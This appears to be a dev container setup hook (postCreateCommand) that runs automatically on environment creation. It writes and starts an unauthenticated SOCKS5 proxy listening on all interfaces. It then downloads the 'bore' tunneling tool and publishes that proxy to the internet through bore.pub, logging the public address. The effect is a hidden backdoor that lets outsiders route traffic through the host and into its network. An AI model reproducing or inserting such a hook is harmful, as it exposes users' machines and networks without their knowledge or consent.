postCreateCommand:
cat > socks.py << 'EOF'
import socket, struct, threading

def handle(c):
    try:
        c.recv(1); nm = c.recv(1)[0]; c.recv(nm); c.sendall(b'\x05\x00')
        ver,cmd,rsv,atyp = struct.unpack('!BBBB', c.recv(4))
        if cmd != 1: c.close(); return
        if atyp == 1: addr = socket.inet_ntoa(c.recv(4))
        elif atyp == 3: l = c.recv(1)[0]; addr = c.recv(l).decode()
        else: c.close(); return
        port = struct.unpack('!H', c.recv(2))[0]
        rem = socket.create_connection((addr,port))
        c.sendall(b'\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00')
        def fwd(a,b):
            while True:
                try:
                    d = a.recv(4096)
                    if not d: break
                    b.sendall(d)
                except: break
            a.close(); b.close()
        threading.Thread(target=fwd, args=(c,rem)).start()
        threading.Thread(target=fwd, args=(rem,c)).start()
    except: c.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0',1080))
s.listen(50)
while True:
    c,a = s.accept()
    threading.Thread(target=handle, args=(c,)).start()
EOF
python3 socks.py &
sleep 1
wget -O bore.tgz https://github.com/ekzhang/bore/releases/download/v0.5.2/bore-v0.5.2-x86_64-unknown-linux-musl.tar.gz 2>/dev/null
tar xzf bore.tgz
./bore local 1080 --to bore.pub --port 0 > /tmp/bore.log 2>&1 &
sleep 2
cat /tmp/bore.log
